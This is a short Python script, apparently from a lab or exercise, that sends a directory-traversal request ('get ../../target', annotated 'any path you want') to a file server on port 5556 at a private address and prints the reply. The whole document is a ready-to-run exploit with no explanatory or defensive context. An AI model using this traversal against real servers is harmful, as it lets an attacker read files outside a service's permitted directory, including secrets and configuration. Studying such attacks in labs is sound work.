import socket

FILE_PORT = 5556
message = "get ../../target" # any path you want
def request_file(server_ip, server_port, message):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        s.sendall(message .encode('utf-8'))
        while True:
            data = s.recv(1024)
            if not data:
                break
            print(data)
request_file("10.0.0.170",5556,message)